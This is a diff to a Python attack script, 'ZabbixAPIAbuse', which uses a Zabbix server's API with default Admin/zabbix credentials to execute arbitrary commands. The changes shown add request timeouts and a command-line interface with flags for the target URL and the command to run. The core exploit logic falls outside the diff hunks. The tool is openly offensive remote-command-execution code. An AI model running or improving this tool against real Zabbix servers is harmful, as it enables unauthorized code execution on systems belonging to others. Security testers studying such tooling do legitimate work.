@@ -2,6 +2,7 @@ from requests import post, get
 from time import sleep
 import random
 import string
+import argparse
 
 class ZabbixAPIAbuse(object):
     def __init__(self, url, cmd, method = 'action', user = 'Admin', password = 'zabbix', proxies = None):
@@ -20,13 +21,13 @@ class ZabbixAPIAbuse(object):
 
     def post(self, payload):
         if self.proxies:
-            return post(self.url, json = payload, verify = False, proxies = self.proxies)
+            return post(self.url, json = payload, verify = False, proxies = self.proxies, timeout=10)
         else:
             return post(self.url, json = payload, verify = False)
 
     def get(self, payload):
         if self.proxies:
-            return get(self.url, verify = False, proxies = self.proxies)
+            return get(self.url, verify = False, proxies = self.proxies, timeout=10)
         else:
             return get(self.url, verify = False)
 
@@ -280,4 +281,12 @@ class ZabbixAPIAbuse(object):
             self.item()
 
 if __name__ == '__main__':
-    ZabbixAPIAbuse(input('URL: '), input('CMD: '), input('Method [Default: action] (action / item): '), input('Username [Default: Admin]: '), input('Password [Default: zabbix]: '))
+    parser = argparse.ArgumentParser(description="Zabbix goes brrrrr")
+    parser.add_argument("--url", metavar="", help="url to target (Ex : http://192.168.1.1/zabbix/api_jsonrpc.php )", required=True)
+    parser.add_argument("-c", "--cmd", metavar="", help="Command to execute", required=True)
+    parser.add_argument("-m", "--method", metavar="", help="Method to use (action / item)", required=True)
+    parser.add_argument("-u", "--user", metavar="", help="Username of the zabbix user", default="Admin", required=True)
+    parser.add_argument("-p", "--password", metavar="", help="Password for the zabbix user", default="zabbix", required=True)
+    args = parser.parse_args()
+
+    ZabbixAPIAbuse(args.url, args.cmd, args.method, args.user, args.password)
